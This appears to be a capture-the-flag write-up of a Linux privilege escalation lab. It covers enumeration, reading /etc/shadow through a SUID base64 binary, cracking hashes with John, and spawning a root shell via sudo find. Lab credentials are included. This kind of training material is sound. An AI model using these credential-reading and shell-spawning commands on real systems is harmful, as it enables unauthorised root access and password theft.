## Lunix Privilege Escalation Capstone

We can access machine with given credentials:

-   Username: leonard
-   Password: Penny123

Once we got into machine we start with manual enumeration:

```bash
sudo -l 
```
which gives us nothing

Trying to run:
```bash
cat /etc/passwd
```
success. Command returns content of the file.

Trying another one:
```bash
cat /etc/shadow
```
but nothing was returned.

Getting another users from passwd file with:
```bash
cat /etc/passwd | grep home
```

```bash
missy
leonard
```

Well, if we can read passwd file maybe we have possibility to read **shadow** file too.

Lets start with capabilities:
```bash
$ getcap -r / 2>/dev/null
/usr/bin/newgidmap = cap_setgid+ep
/usr/bin/newuidmap = cap_setuid+ep
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/mtr = cap_net_raw+ep
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
```
no useful binaries.

```bash
cat /etc/crontab
```
no cron jobs too.

Maybe there is binaries with SUID set :
```bash
find / -perm -u=s -type f 2>/dev/null
```

```bash
/usr/bin/base64
...
```

`/usr/bin/base64` - our beloved friend. We can read shadow file now:

```bash
SHDW=/etc/shadow
base64 "$SHDW" | base64 --decode > shadow.pwn
```

Next step is missy's password. So I copied shadow and passwd to my machine, unshadowed it and tried to unhash passwords with John.
```bash
unshadow passwd.pwn shadow.pwn
ohn --wordlist=/usr/share/wordlists/rockyou.txt unshadowed 
```
John found it easily and we got missy's password.

We can su with missy's account but instead we SSH again with missy's account. 
Looking for flag on account: 
```bash
find / -name flag1.txt 2>/dev/null
```
Success! We got 1st part.

**Time to get part 2.**

Ok, let's start with 
```bash
sudo -l
```
and ... success on first try!
```
User missy may run the following commands on ip-10-10-89-210:
    (ALL) NOPASSWD: /usr/bin/find
```

Getting root (thanks to [gtfobins](https://gtfobins.github.io/gtfobins/find/)):
```bash
sudo find . -exec /bin/sh \; -quit
```

We are root now! So, time to get flag2, but where it is?
```bash
find / -name flag2.txt 2>/dev/null
```
Found it. Now we read and it is done!